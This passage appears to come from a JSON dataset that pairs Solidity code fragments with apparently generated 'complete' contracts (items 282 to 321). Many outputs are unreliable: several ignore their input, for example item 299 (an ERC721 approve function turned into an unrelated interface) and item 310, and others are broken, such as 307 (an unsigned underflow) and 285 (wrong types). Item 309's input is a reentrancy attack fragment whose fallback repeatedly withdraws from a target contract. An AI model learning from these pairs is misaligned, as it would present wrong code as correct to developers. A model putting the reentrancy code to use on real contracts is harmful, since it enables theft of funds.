        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256 totalsupply);\n    function decimals() external view returns (uint8 decimals);\n\n\n    function balanceOf(address account) external view returns (uint256 balance);\n    function transfer(address recipient, uint256 amount) external returns (bool success);\n    function allowance(address owner, address spender) external view returns (uint256 remaining);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool success);\n    function approve(address spender, uint256 amount) external returns (bool success);\n    function getApproved(address spender) external view returns (uint256 remaining);\n}\n\ninterface IISwapRouter02 {\n    \n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    )\n        external\n        payable\n        returns (uint amountTokenTaken, uint ethAmountReturned, uint amountTokenLeft);\n\n    function swapExactETHForTokens(\n        address token,\n        uint amountTokenDesired,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    )\n        external\n        payable\n        returns (uint amountTokenReceived, uint ethAmountReturned, uint amountTokenLeft);\n\n    function swapExactTokensForETH(uint amountTokenDesired)\n        external\n        returns (uint ethAmountReceived, uint amountTokenLeft);\n}\n\n"
    },
    "282.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"https:\n\ncontract TokenTransfer {\n    IERC20 _token;\n\n    constructor(address token) {\n        _token = IERC20(token);\n    }\n\n    modifier checkAllowance(uint amount) {\n        require(_token.allowance(msg.sender, address(this)) >= amount, \"Error\");\n        _;\n    }\n\n    function depositTokens(uint _amount) public checkAllowance(_amount) {\n        _token.transferFrom(msg.sender, address(this), _amount);\n    }\n    \n    function stake(address to, uint amount) public {\n        _token.transfer(to, amount);\n    }\n\n    function getSmartContractBalance() external view returns(uint) {\n        return _token.balanceOf(address(this));\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transfer(address to, uint amount) external returns (bool);\n\n    function transferFrom(address from, address to, uint amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint amount);\n\n    event Approval(address indexed owner, address indexed spender, uint amount);\n}\n\n"
    },
    "283.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        borrow(uint256(getLatestPrice()));\n    }\n    \n    function getLatestPrice() internal returns (int256) {\n        return 1;\n    }\n    \n    function borrow(uint256 _number) internal {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        borrow(uint256(getLatestPrice()));\n    }\n    \n    function getLatestPrice() internal returns (int256) {\n        return 1;\n    }\n    \n    function borrow(uint256 _number) internal {\n    }\n}\n\n"
    },
    "284.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract SimpleStorage {\n\n    uint256 favoriteNumber;\n    bool favoriteBool;\n\n    struct People\n    {\n        uint256 favoriteNumber;\n        string name;\n    }\n\n    People[] public people;\n\n        function store(uint256 _favoriteNumber) public {\n            favoriteNumber =_favoriteNumber;\n        }\n    }\n  \n\n\n",
        "output": "pragma solidity ^0.8.7;\n\ncontract SimpleStorage {\n\n    uint256 favoriteNumber;\n    bool favoriteBool;\n\n    struct People\n    {\n        uint256 favoriteNumber;\n        string name;\n    }\n\n    People[] public people;\n\n        function store(uint256 _favoriteNumber) public {\n            favoriteNumber =_favoriteNumber;\n        }\n    }\n  \n\n"
    },
    "285.sol": {
        "input": "  Request memory newRequest = Request({\n        descritption: descritpion,\n        value: value,\n        recipient: recipient,\n        complete: false\n    });\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Request {\n\n    string public descritption;\n    address  public value;\n    address  public recipient;\n    bool public complete;\n\n    constructor(string _descrption, address _value, address _recipient) public {\n        descritption = _descrption;\n        value = _value;\n        recipient = _recipient;\n        complete = false;\n    }\n}\n\n"
    },
    "286.sol": {
        "input": "uint256 randomness = uint(keccak256(abi.encodePacked(msg.sender, block.difficulty, block.timestamp)));\n\n    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {\n        uint256 randomness = _randomWords[0];\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IRandomWords {\n    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) external;\n}\n\n"
    },
    "288.sol": {
        "input": "mapping(uint => Record[]) recordsByUserID;\n\nRecords userRecords[] = recordsByUserID[user_id];\n\nevent Approved(uint indexed userId, uint indexed recordId);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Records {\n    struct Record {\n        address user;\n        uint256 timestamp;\n        string title;\n        string description;\n        uint256 amount;\n    }\n\n    mapping(uint => Record[]) recordsByUserID;\n\n    Record[] public records;\n\n    event Approved(uint indexed userId, uint indexed recordId);\n\n    constructor() public {\n        recordsByUserID[0].push(Record(msg.sender, block.timestamp, \"Test Record 1\", \"This is the first record on the network\", 1000));\n        recordsByUserID[1].push(\n            Record(msg.sender, block.timestamp, \"Test Record 2\", \"This is the second record on the network\", 1000)\n        );\n        recordsByUserID[2].push(\n            Record(msg.sender, block.timestamp, \"Test Record 3\", \"This is the third record on the network\", 1000)\n        );\n    }\n\n    function approve(uint userId, uint recordId) external {\n        recordsByUserID[userId].push(\n            Record(msg.sender, block.timestamp, \"Test Record 4\", \"This is the fourth record on the network\", 1000)\n        );\n        emit Approved(userId, recordId);\n    }\n}\n\n"
    },
    "289.sol": {
        "input": "pragma solidity ^0.8.16;\n \nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract MyToken is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MyT\") {\n        _mint(msg.sender, 1000 * 1e18);\n    }\n\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {\n        if (to.code.length > 0) {\n            try IERC20Receiver(to).onERC20Receive(from, amount) returns (bool success) {\n            } catch {\n            }\n        }\n    }\n}\n\ninterface IERC20Receiver {\n    function onERC20Receive(address from, uint256 amount) external returns (bool);\n}\n\ncontract SomeReceiver is IERC20Receiver {\n    event ReceivedTokens(address from, uint256 amount);\n\n    function onERC20Receive(address from, uint256 amount) external returns (bool) {\n        emit ReceivedTokens(from, amount);\n        return true;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20Receiver {\n    function onERC20Receive(address from, uint256 amount) external returns (bool);\n}\n\n"
    },
    "290.sol": {
        "input": "function withdrawalTokens(address _addressChange) public {\n    require (msg.sender == owner);\n\n    uint256 amountToWithdraw = stakingBalance[_addressChange];\n\n    stakingBalance[_addressChange] = 0;\n\n    USDc.transfer(msg.sender, amountToWithdraw);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    address public owner;\n    mapping(address => uint256) public stakingBalance;\n    ERC20 public USDc;\n\n    constructor(address _USDc) {\n        owner = msg.sender;\n        USDc = ERC20(_USDc);\n    }\n\n    function withdrawalTokens(address _addressChange) public {\n        require(msg.sender == owner, \"Only the owner can withdraw tokens\");\n\n        uint256 amountToWithdraw = stakingBalance[_addressChange];\n\n        stakingBalance[_addressChange] = 0;\n\n        require(USDc.transfer(msg.sender, amountToWithdraw), \"Token transfer failed\");\n    }\n}\n"
    },
    "291.sol": {
        "input": "function getPower() public {\n    require(election_state == ELECTION_STATE.OPEN);\n    require(votingPeriod > block.timestamp);\n    voters[msg.sender].power = msg.sender.balance * 10;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ElectionV2 {\n    enum ElectionState {\n        ELECTION_STATE_OPEN,\n        ELECTION_STATE_VOTING,\n        ELECTION_STATE_CLOSED\n    }\n\n    address private election_admin;\n\n    address[] private voters;\n\n    uint256 public votingPeriod;\n\n    ElectionState private election_state;\n\n\n    constructor() public {\n        election_admin = msg.sender;\n        election_state = ElectionState.ELECTION_STATE_OPEN;\n        votingPeriod = block.timestamp + 10 * 1 days;\n    }\n\n    \n}\n\n"
    },
    "292.sol": {
        "input": "function _transfer(address sender,address recipient, uint256 amount) private returns(bool){\n    require(recipient != address(0),\"ERC20: transfer to the zero address\");\n    uint256 senderBalances = balanceOf[sender];\n    require(senderBalances >= amount,\"You don't have enough token\");\n    balanceOf[sender] = senderBalances - amount;\n    balanceOf[recipient] += amount;\n\n    return true;\n}\n\nsomeaddress = (await ethers.getSigners())[1]\nconsole.log(\"Balance:\", (await someAddress.getBalance()).toString());\n\nnetworks: {\n        hardhat: {\n            chainId: 31337,\n        },\n      ...\n  }\n\n  npx hardhat test\n\nnpx hardhat node\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestToken {\n    function _transfer(address sender,address recipient, uint256 amount) private returns(bool){\n    require(recipient != address(0),\"ERC20: transfer to the zero address\");\n    uint256 senderBalances = balanceOf[sender];\n    require(senderBalances >= amount,\"You don't have enough token\");\n    balanceOf[sender] = senderBalances - amount;\n    balanceOf[recipient] += amount;\n\n    return true;\n}\n\n\nmapping (address => uint256) public balanceOf;\n\n\nevent Transfer(address indexed from, address indexed to, uint256 value);\n\n\n constructor() public {\n    balanceOf[msg.sender] = 100000000000000000;\n}\n\nfunction transfer(address recipient,uint256 amount) public returns (bool) {\n    _transfer(msg.sender,recipient,amount);\n}\n\n\n\n\n}\n\n"
    },
    "293.sol": {
        "input": "uint256 senderBalance = _balances[sender];\nrequire(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\nunchecked {\n\n    _balances[sender] = senderBalance - amount;\n}\n\nuint256 senderBalance = _balances[sender];\nrequire(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n\n_balances[sender] = senderBalance - amount;\n\n_balances[sender] -= amount;\n\nunchecked {\n    _balances[sender] -= amount;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\n"
    },
    "294.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    event DataRequested(string url);\n\n    function requestData(string memory url) public {\n        emit DataRequested(url);\n    }\n\n    function receiveData(bytes memory data) public {\n        require(msg.sender == address(0x123));\n    }\n}\n\nconst Web3 = require(\"web3\");\nconst web3 = new Web3(YOUR_NODE_URL);\n\nconst myContract = new web3.eth.Contract(ABI, ADDRESS);\n\nmyContract.events.DataRequested(async (eventData) => {\n    const result = queryUrl(eventData.returnValues.url);\n\n    await myContract.methods.receiveData(result).send({\n        from: \"0x123\"\n    });\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event DataRequested(string url);\n\n    function requestData(string memory url) public {\n        emit DataRequested(url);\n    }\n\n    function receiveData(bytes memory data) public {\n        require(msg.sender == address(0x123));\n    }\n}\n\n"
    },
    "296.sol": {
        "input": "function GetBetTitle(address betAddress) public view returns(string){\n       BetContract currentBet = BetContract(payable(betAddress));\n\n       return currentBet.GetTitle();\n   }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract BettingPool {\n   function GetBetTitle(address betAddress) public view returns(string);\n}\n\n"
    },
    "299.sol": {
        "input": "function approve(address to, uint256 tokenId) public virtual override {\n    address owner = ERC721.ownerOf(tokenId);\n    require(to != owner, \"ERC721: approval to current owner\");\n\n    require(\n        _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n        \"ERC721: approve caller is not owner nor approved for all\"\n    );\n\n    _approve(to, tokenId);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IEnumerator {\n    function totalSupply() external view returns (uint256);\n    function tokenOf(uint256 index) external view returns (uint256 tokenId);\n}\n\n"
    },
    "300.sol": {
        "input": "pragma solidity >=0.8.0;\n\ncontract Abi2Test {\n\n    function getByte() public returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encode(func);\n     }\n\n    function getByte2() public returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encodePacked(func);\n     }\n}\n\npragma solidity >=0.8.0;\n\ncontract Abi2Test {\n\n    event A(uint256);\n    event Out(bytes);\n    event Out1(bytes);\n\n    function test() public {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n\n        uint256[] memory arr = new uint256[](3);\n        arr[0] = 3;\n        arr[1] = 4;\n\n\n        (bool res, bytes memory data) = address(this).call(abi.encodePacked(func, abi.encode(arr)));\n        emit Out(data);\n        require(res);\n    }\n\n    function callMe(uint256[] memory array) public {\n            emit A(array.length);\n            emit Out1(msg.data);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Abi2Test {\n\n    function getByte() public returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encode(func);\n     }\n\n    function getByte2() public returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encodePacked(func);\n     }\n}\n\n"
    },
    "301.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"hardhat/console.sol\";\n\ncontract MeetingCreation {\n\n    struct Meeting {\n        address meeting_creator;\n        uint256 meetingID;\n        string name;\n        string description;\n        uint256 start_date;\n        uint256 end_date;\n        uint256 max_tickets;\n        uint256 ticket_price;\n        uint256 current_tickets_sold;\n        address[] attendees;\n    }\n\n    mapping(uint => Meeting) meetings;\n\n    function RSVP (uint256 MEETINGID) public payable {\n        Meeting storage m = meetings[MEETINGID];\n\n        require(m.current_tickets_sold < m.max_tickets,\n            \"No more tickets available\"\n        );\n\n        require(msg.sender.balance >= m.ticket_price,\n            \"Not enough funds\"\n        );\n\n        address[] storage adr;\n        adr = m.attendees;\n        adr.push(msg.sender); \n        m.current_tickets_sold += 1;\n    }\n\n    function getSmartContractBalance() external view returns(uint) {\n        return address(this).balance;\n    }\n}  \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MeetingCreation {\n\n    struct Meeting {\n        address meeting_creator;\n        uint256 meetingID;\n        string name;\n        string description;\n        uint256 start_date;\n        uint256 end_date;\n        uint256 max_tickets;\n        uint256 ticket_price;\n        uint256 current_tickets_sold;\n        address[] attendees;\n    }\n\n    mapping(uint => Meeting) meetings;\n\n    function RSVP (uint256 MEETINGID) public payable {\n        Meeting storage m = meetings[MEETINGID];\n\n        require(m.current_tickets_sold < m.max_tickets,\n            \"No more tickets available\"\n        );\n\n        require(msg.sender.balance >= m.ticket_price,\n            \"Not enough funds\"\n        );\n\n        address[] storage adr;\n        adr = m.attendees;\n        adr.push(msg.sender); \n        m.current_tickets_sold += 1;\n    }\n\n    function getSmartContractBalance() external view returns(uint) {\n        return address(this).balance;\n    }\n}  \n\n"
    },
    "302.sol": {
        "input": "bytes <var_name> = bytes(<string_var>);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n\n    bytes public var_name;\n\n    constructor() public {\n        var_name = bytes(\"test\");\n    }\n}\n\ncontract Test2 {\n\n    bytes public var_name;\n\n    constructor() public {\n        var_name = bytes(\"hello\");\n    }\n\n    function set_var_name() public {\n        var_name = bytes(\"world\");\n    }\n}\n\n"
    },
    "304.sol": {
        "input": "uint public counter;\n\nmapping(uint = > Deposit) public ids; \n\nfunction deposit() public payable {\n\n    Deposit storage _deposit = ids[_counter]; \n\n    _deposit.depositAmount = msg.value; \n\n    _deposit.depositor = msg.sender;\n    \n    activeDeposits.push(_deposit);\n\n    _counter++; \n\n    emit DepositMade(msg.sender, msg.value);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Deposit {\n    event DepositMade(address indexed depositor, uint depositAmount);\n\n    struct Deposit {\n        uint   depositAmount;\n        address depositor;\n    }\n}\n\n"
    },
    "305.sol": {
        "input": "address[] public owners;\n\nowners[i] = temp[i];\n\nfor(uint256 i=0; i<temp.length; i++) {\n    owners.push(temp[i]);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Owners {\n\n    address[] public owners;\n\n    constructor (address[] memory temp) {\n        for (uint i=0; i< temp.length; i++) {\n            owners.push(temp[i]);\n        }\n    }\n\n\n}\n\n"
    },
    "306.sol": {
        "input": "  function setRandomNumberGenerator(address _randomNumberGenerator) external onlyOwner {\n    randomNumberGenerator = IRandomNumberGenerator(_randomNumberGenerator);\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IRandomNumberGenerator {\n  function getRandomNumber() external view returns (uint256);\n}\n\n"
    },
    "307.sol": {
        "input": "i -= 1;\n\nunchecked {\n  i -= 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n  uint i = 0;\n\n  function test() public {\n    i -= 1;\n\n  }\n}\n\n"
    },
    "308.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract FinalExcercise {\n    uint256 a = 300;\n    uint256 b = 12;\n    uint256 f = 47;\n\n    function finalize() public view returns (uint256) {\n        uint256 d = 23;\n        if (a <= a && b < f) {\n            return (d * 2) - b;\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract FinalExcercise {\n    uint256 a = 300;\n    uint256 b = 12;\n    uint256 f = 47;\n\n    function finalize() public view returns (uint256) {\n        uint256 d = 23;\n        if (a <= a && b < f) {\n            return (d * 2) - b;\n        }\n    }\n}\n\n"
    },
    "309.sol": {
        "input": "address public target;\n    uint32 public i = 0;\n    constructor(address _target) payable {\n        target=_target;\n    }\n\n     bytes memory payload=abi.encodeWithSignature(\"donate(address)\",_to);\n    (bool success,)=target.call{value:val}(payload);\n    require(success,\"target.call failed\");\n\nfallback() external payable {\n    i++;\n    require(i<target.balance,\"error here\");\n    Reentrance(payable(target)).withdraw(1);\n}\n\n function callwithdraw() public \n    {\n        target.call(abi.encodeWithSignature(\"withdraw(uint)\",1));\n    }\n\n    i++;\n    require(i<target.balance);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Reentrance {\n   function withdaw(uint256) external payable;\n}\n\ninterface IERC1669 {\n    function withdraw(uint amount) external;\n}\n\n"
    },
    "310.sol": {
        "input": "uint[] memory dynamicMemArray = new uint[](size);\n\nfunction doesSomethingWithArray(uint x) ... {\n    uint[] storage dynamicStorageArray;\n    dynamicStorageArray.push(x); \n    ...\n}\n\n\nuint[][3] public dynamicStorageArrays; \nfunction doesSomethingWithArray(uint x) ... {\n    uint[] storage dynamicStorageArray = dynamicStorageArrays[1];\n    dynamicStorageArray.push(x);\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface IERC20 {\n        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool success);\n    }\n\n    interface IERC721 {\n        function setApprovalForAll(address operator, bool approved) external virtual;\n        function hasApproved(address caller, address operator) external view returns (bool);\n        function setApproveAll(address operator, bool approved) external virtual;\n        function getApproved(address caller, address operator) external view returns (bool);\n    }\n\n"
    },
    "311.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Struct1Type {\n        uint8 number;\n    }\n\n    struct Struct2Type {\n        uint16 number;\n    }\n\n    function callFunction(bytes calldata _data) external pure returns (Struct1Type memory, Struct2Type memory) {\n        Struct1Type memory data1 = abi.decode(_data[:32], (Struct1Type));\n\n        Struct2Type memory data2 = abi.decode(_data[32:], (Struct2Type));\n\n        return (data1, data2);\n    }\n}\n\n# two values: `1` and `2`\n0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000002\n\n0: tuple(uint8): 1\n1: tuple(uint16): 2\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Struct1Type {\n        uint8 number;\n    }\n\n    struct Struct2Type {\n        uint16 number;\n    }\n\n    function callFunction(bytes calldata _data) external pure returns (Struct1Type memory, Struct2Type memory) {\n        Struct1Type memory data1 = abi.decode(_data[:32], (Struct1Type));\n\n        Struct2Type memory data2 = abi.decode(_data[32:], (Struct2Type));\n\n        return (data1, data2);\n    }\n}\n\n"
    },
    "312.sol": {
        "input": "pragma solidity >=0.6.0 <0.9.0;\n\ncontract Map {\n    mapping (uint => uint)[] array;\n\n    function allocate(uint newMaps) public {\n        for (uint i = 0; i < newMaps; i++)\n            array.push();\n    }\n\n    function writeMap(uint map, uint key, uint value) public {\n        array[map][key] = value;\n    }\n\n    function readMap(uint map, uint key) public view returns (uint) {\n        return array[map][key];\n    }\n\n    function eraseMaps() public {\n        delete array;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.6.0 <0.9.0;\n\ncontract Map {\n    mapping (uint => uint)[] array;\n\n    function allocate(uint newMaps) public {\n        for (uint i = 0; i < newMaps; i++)\n            array.push();\n    }\n\n    function writeMap(uint map, uint key, uint value) public {\n        array[map][key] = value;\n    }\n\n    function readMap(uint map, uint key) public view returns (uint) {\n        return array[map][key];\n    }\n\n    function eraseMaps() public {\n        delete array;\n    }\n}\n\n"
    },
    "313.sol": {
        "input": "pragma solidity ^0.8.2;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\ncontract WTest is ERC721, ERC721Enumerable, ERC721Burnable, Ownable {\n    using Strings for uint256;\n    using SafeMath for uint256;\n\n\n    uint256 public mintPrice;\n    address public blackHoleAddress;\n    \n    ERC721 public crateContract;\n\n    string public baseURI;\n    string public baseExtension = \".json\";\n    mapping(uint256 => bool) private _crateProcessList;\n\n    bool public paused = false;\n    bool public revealed = false;\n\n    uint256 public maxSupply = 5000;\n    uint256 public maxPrivateSupply = 580;\n    uint256 public maxMintAmount = 20;\n    string public notRevealedUri;\n\n    event OperationResult(bool result, uint256 itemId);\n   \n\n    constructor() ERC721(\"WTest\", \"WTST\") {}\n\n    function _baseURI() internal view virtual override returns (string memory) {\n    return baseURI;\n  }\n\n    function setBASEURI(string memory newuri) public onlyOwner {\n        baseURI = newuri;\n    }\n\n     function setMintPrice(uint256 _mintPrice) public onlyOwner  returns(bool success) {\n        mintPrice = _mintPrice;\n        return true;\n    }\n\n    function getMintPrice() public view returns (uint256)\n    {\n    return mintPrice;\n    }\n\n    function setBlackHoleAddress(address _blackHoleAddress) public onlyOwner  returns(bool success) {\n        blackHoleAddress = _blackHoleAddress;\n        return true;\n    }\n\n\n    function setcrateContractAddress(ERC721 _crateContractAddress) public onlyOwner returns (bool success) {\n        crateContract = _crateContractAddress;\n        return true;\n    }\n\n    function mint(uint256 _mintAmount) public payable {\n        uint256 supply = totalSupply();\n        require(!paused);\n        require(_mintAmount > 0);\n        require(_mintAmount <= maxMintAmount);\n        require(supply + _mintAmount <= maxSupply);\n\n        if (msg.sender != owner()) {\n        require(msg.value >= mintPrice * _mintAmount);\n        }\n\n        for (uint256 i = 1; i <= _mintAmount; i++) {\n        _safeMint(msg.sender, supply + i);\n        }\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal override(ERC721, ERC721Enumerable) {\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC721, ERC721Enumerable) returns (bool) {\n        return super.supportsInterface(interfaceId);\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721Receiver {\n     function onERC721Received(address from, uint256 tokenId, bytes calldata data) external returns (bytes4);\n}\n\ninterface ERC721Burnable {\n   \n    function burn(address owner, uint256 tokenId) external;\n}\n\n"
    },
    "314.sol": {
        "input": "struct teamWallets {\n    string name;\n    uint256 balance;\n}\n\nmapping(address => teamWallets) public getInfoByWallet;\n\n\nfunction setInfo(address _wall, string memory _name, uint256 _balance) public {\n    getInfoByWallet[_wall].name=_name;        \n    getInfoByWallet[_wall].balance=_balance;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TeamWallets {\n    struct TeamWallet {\n        string name;\n        uint256 balance;\n    }\n\n    mapping(address => TeamWallet) public teamWallets;\n\n    function setInfo(address _wallet, string memory _name, uint256 _balance) public {\n        TeamWallet storage wallet = teamWallets[_wallet];\n        wallet.name = _name;\n        wallet.balance = _balance;\n    }\n\n    function getInfo(address _wallet) public view returns (string memory name, uint256 balance) {\n        TeamWallet storage wallet = teamWallets[_wallet];\n        return (wallet.name, wallet.balance);\n    }\n}\n\n"
    },
    "315.sol": {
        "input": "pragma solidity ^0.6.0;\n\nimport \"https:\nimport \"https:\nimport \"https:\n\ncontract MyContract {\n  address private wallet = 0x0000000000000000000000000;\n\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n  address private wallet = 0x0000000000000000000000000;\n\n  function() external payable {\n    uint256 _value = msg.value;\n    \n    require (\n      msg.value >= 1 ether,\n      \"This contract accepts only 1 ether payments\"\n    );\n  \n    wallet.transfer(_value);\n  }\n}\n\n"
    },
    "316.sol": {
        "input": "struct inputData {\n    address admin;\n    uint256 price;\n    uint256 balance;\n    address rewardToken;\n}\n\nfunction setAllowedTokensData(address _token, inputData[] memory _data) public {\n    for (uint256 dataIndex = 0; dataIndex < _data.length; dataIndex++) {\n        allowedTokensData[_token] = allowedTokenDetails(\n            _data[dataIndex].admin,\n            _data[dataIndex].price,\n            _data[dataIndex].balance,\n            _data[dataIndex].rewardToken,\n            0, \n            block.timestamp\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct inputData {\n        address admin;\n        uint256 price;\n        uint256 balance;\n        address rewardToken;\n    }\n    \n    struct allowedTokenDetails {\n        address admin;\n        uint256 price;\n        uint256 balance;\n        address rewardToken;\n        uint256 someValue;\n        uint256 timestamp;\n    }\n    \n    mapping(address => allowedTokenDetails) public allowedTokensData;\n    \n    function setAllowedTokensData(address _token, inputData[] memory _data) public {\n        for (uint256 dataIndex = 0; dataIndex < _data.length; dataIndex++) {\n            allowedTokensData[_token] = allowedTokenDetails(\n                _data[dataIndex].admin,\n                _data[dataIndex].price,\n                _data[dataIndex].balance,\n                _data[dataIndex].rewardToken,\n                0, \n                block.timestamp\n            );\n        }\n    }\n}\n"
    },
    "317.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract GLDToken is ERC20 {\n    constructor(uint256 initialSupply) ERC20(\"Gold\", \"GLD\") {\n        _mint(msg.sender, initialSupply);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    \n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "318.sol": {
        "input": "keccak256(addr.concat(\"5\"))); \n\nkeccak256(ethers.utils.solidityPack([\"address\", \"string\"], [addr, \"5\"]))\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "319.sol": {
        "input": "\nfunction bookroom(uint256 _index) public payable uptofee{\n            payable(owner).transfer(msg.value);\n            roomstatus = Status.Occupied;\n            bookertoroom[msg.sender] = hotelroomsarray[_index];\n            bookertoroomTostatusofroom[roomstatus][msg.sender] = \n               hotelroomsarray[_index];        \n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BookRoomRooms {\n    mapping(address => uint256) public bookertoroom;\n    mapping(address => uint256) public bookertoroomTostatusofroom;}\n\n"
    },
    "320.sol": {
        "input": " Note: The called function should be payable if you send value and the \n       value you send should be less than your current balance.\n\n    constructor(uint256 _initialSupply) payable {\n            balanceOf[msg.sender] = _initialSupply;\n            totalSupply = _initialSupply;\n    }\n    \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FakeToken {\n    \n    mapping(address => uint256) public balanceOf;\n\n    uint256 public totalSupply;\n\n    constructor(uint256 _initialSupply) payable {\n            balanceOf[msg.sender] = _initialSupply;\n            totalSupply = _initialSupply;\n    }\n    \n}\n\n"
    },
    "321.sol": {
        "input": "function createCampaign(Reward[] memory _rewards)\n    public\n{\n    Campaign newCampaign = new Campaign(address(this), msg.sender);\n\n    for (uint256 i = 0; i < _rewards.length; i++) {\n        newCampaign.createReward(\n            _rewards[i].contribution,\n            _rewards[i].maxNumber,\n            _rewards[i].ImageLink,\n            msg.sender\n        );\n    }\n    deployedCampaigns.push(newCampaign);\n}\n\naddress factory;\naddress public manager;\n\nmodifier restrictedThroughFactory(address user) {\n    require(msg.sender == factory && user == manager);\n    _;\n}\n\nmodifier restricted() {\n    require(msg.sender == manager);\n    _;\n}\n\nconstructor(address _factory, address creator) {\n    factory = _factory;\n    manager = creator;\n}\n\nfunction createReward(\n    uint256 _contribution,\n    uint256 _maxNumber,\n    string memory _imageLink\n) public restricted {\n    _createReward(_contribution, _maxNumber, _imageLink);\n}\n\nfunction createReward(\n    uint256 _contribution,\n    uint256 _maxNumber,\n    string memory _imageLink,\n    address user\n) public restrictedThroughFactory(user) {\n    _createReward(_contribution, _maxNumber, _imageLink);\n}\n\nfunction _createReward(\n    uint256 